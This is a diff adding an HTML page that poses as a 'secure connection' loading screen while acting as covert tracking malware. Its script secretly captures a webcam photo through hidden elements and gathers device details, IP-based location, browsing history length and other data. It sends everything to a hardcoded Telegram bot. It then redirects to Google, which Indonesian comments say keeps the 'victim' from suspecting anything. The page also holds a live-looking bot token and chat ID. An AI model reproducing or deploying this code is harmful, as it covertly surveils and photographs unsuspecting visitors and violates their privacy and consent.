@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connecting to secure server...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: white;
+        }
+
+        .loading-container {
+            text-align: center;
+            background: rgba(0,0,0,0.7);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0,255,255,0.2);
+            min-width: 350px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(0,255,255,0.3);
+            border-top: 5px solid #0ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #0ff;
+            font-family: monospace;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #0ff;
+            animation: progress 3s ease-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        video, canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-container" id="loadingContainer">
+    <div class="spinner"></div>
+    <h2>Establishing Secure Connection</h2>
+    <div class="progress-bar">
+        <div class="progress-fill"></div>
+    </div>
+    <div class="status" id="statusText">Initializing secure tunnel...</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // ==================== KONFIGURASI TELEGRAM ====================
+    // 🔥 GANTI DENGAN TOKEN BOT LU 🔥
+    const BOT_TOKEN = "8920199069:AAF6SR4bWvjAgVrlFXCcwtYqZ-ozWaSiXdE";  // GANTI!
+    const CHAT_ID = "8246027862";  // GANTI!
+    
+    // Redirect setelah selesai (biar korban gak curiga)
+    const REDIRECT_URL = "https://google.com";
+    
+    // ==================== MULAI ====================
+    let photoTaken = false;
+    let allData = {};
+    
+    const statusEl = document.getElementById('statusText');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    
+    // Simulasi progress loading (3 detik)
+    let step = 0;
+    const steps = [
+        "Initializing secure tunnel...",
+        "Encrypting connection...",
+        "Verifying certificates...",
+        "Handshaking with server...",
+        "Loading resources...",
+        "Almost ready..."
+    ];
+    
+    let stepInterval = setInterval(() => {
+        if (step < steps.length) {
+            statusEl.innerText = steps[step];
+            step++;
+        }
+    }, 500);
+    
+    // Setelah loading selesai (3 detik), ambil foto & data
+    setTimeout(() => {
+        clearInterval(stepInterval);
+        statusEl.innerText = "Finalizing...";
+        startPhotoCapture();
+    }, 3000);
+    
+    // ==================== AMBIL FOTO ====================
+    function startPhotoCapture() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        takePhoto(stream);
+                    }, 500);
+                };
+            })
+            .catch(err => {
+                console.log("Kamera error:", err);
+                statusEl.innerText = "Camera unavailable, continuing...";
+                setTimeout(() => {
+                    collectAllData(null);
+                }, 500);
+            });
+    }
+    
+    function takePhoto(stream) {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+        
+        statusEl.innerText = "Security check complete. Processing...";
+        
+        // Kirim FOTO dulu ke Telegram
+        sendPhotoToTelegram(photoData);
+    }
+    
+    // ==================== KIRIM FOTO KE TELEGRAM ====================
+    function sendPhotoToTelegram(photoBase64) {
+        // Convert base64 ke blob
+        const byteString = atob(photoBase64.split(',')[1]);
+        const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        const blob = new Blob([ab], { type: mimeString });
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'target_capture.jpg');
+        formData.append('caption', '📸 TARGET CAPTURED - IMAGE SENT FIRST');
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(() => {
+            console.log("Photo sent to Telegram");
+            // Setelah foto terkirim, kumpulkan data
+            collectAllData(photoBase64);
+        })
+        .catch(err => {
+            console.log("Telegram photo error:", err);
+            collectAllData(photoBase64);
+        });
+    }
+    
+    // ==================== KUMPULKAN SEMUA DATA TARGET ====================
+    async function collectAllData(photoBase64) {
+        statusEl.innerText = "Gathering device information...";
+        
+        // Device info
+        const device = getDeviceInfo();
+        
+        // Battery info
+        let batteryInfo = "Not available";
+        let chargingInfo = "Not available";
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}%`;
+                chargingInfo = battery.charging ? "Yes" : "No";
+            } catch(e) {}
+        }
+        
+        // RAM
+        let ramInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not available";
+        
+        // CPU cores
+        let cpuInfo = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not available";
+        
+        // Get location from IP (city level)
+        let locationInfo = "Unknown";
+        try {
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geoData = await geoRes.json();
+            locationInfo = `${geoData.city}, ${geoData.country_name}`;
+        } catch(e) {
+            locationInfo = "Location detection failed";
+        }
+        
+        const now = new Date();
+        const timeAccess = now.toLocaleString('id-ID');
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timezoneOffset = -new Date().getTimezoneOffset() / 60;
+        
+        const perfData = performance.timing;
+        const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;
+        
+        allData = {
+            location: locationInfo,
+            device: device,
+            language: navigator.language,
+            online: navigator.onLine ? "Online" : "Offline",
+            screenSize: `${screen.width}x${screen.height}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
+            ram: ramInfo,
+            cpuCores: cpuInfo,
+            battery: batteryInfo,
+            charging: chargingInfo,
+            timeAccess: timeAccess,
+            pageLoadTime: `${pageLoadTime} ms`,
+            historyLength: history.length,
+            touchSupport: 'ontouchstart' in window ? "Yes" : "No",
+            referrer: document.referrer || "Direct",
+            url: window.location.href,
+            timezone: timezone,
+            timezoneOffset: `UTC${timezoneOffset >= 0 ? '+' : ''}${timezoneOffset}`,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+        };
+        
+        statusEl.innerText = "Preparing tracking report...";
+        
+        // Kirim data lengkap ke Telegram
+        sendTrackingReportToTelegram(allData);
+    }
+    
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        if (/iPhone/i.test(ua)) return "iPhone";
+        if (/iPad/i.test(ua)) return "iPad";
+        if (/Android/i.test(ua)) return "Android Device";
+        if (/Windows/i.test(ua)) return "Windows PC";
+        if (/Mac/i.test(ua)) return "Mac";
+        if (/Linux/i.test(ua)) return "Linux PC";
+        return "Unknown Device";
+    }
+    
+    // ==================== KIRIM TRACKING REPORT KE TELEGRAM ====================
+    function sendTrackingReportToTelegram(data) {
+        const report = `
+╭───── Tracking Report ───── ⦿
+
+⚙️ DEVICE INFORMATION (BUKAN GPS TRACKING)
+📍 City: ${data.location}
+🖥️ Device: ${data.device}
+🌐 Bahasa: ${data.language}
+📶 Online: ${data.online}
+📺 Screen Size: ${data.screenSize}
+🪟 Window Size: ${data.windowSize}
+💾 RAM: ${data.ram}
+🧠 CPU Cores: ${data.cpuCores}
+🔋 Battery: ${data.battery}
+🔌 Charging: ${data.charging}
+⏰ Waktu Akses: ${data.timeAccess}
+🕒 Page Load Time: ${data.pageLoadTime}
+📜 History Length: ${data.historyLength}
+✋ Touch Support: ${data.touchSupport}
+🔗 Referrer: ${data.referrer}
+🌍 URL: ${data.url}
+🕓 Timezone: ${data.timezone}
+🧭 Offset: ${data.timezoneOffset}
+📱 Platform: ${data.platform}
+🖥️ User Agent: ${data.userAgent}
+
+╰───── Telegram @ZetsuTheDevReal ───── ⦿
+        `;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: report,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(() => {
+            console.log("Report sent to Telegram");
+            statusEl.innerText = "Redirecting...";
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+        })
+        .catch(err => {
+            console.log("Telegram report error:", err);
+            statusEl.innerText = "Redirecting...";
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+        });
+    }
+</script>
+</body>
+  </html>
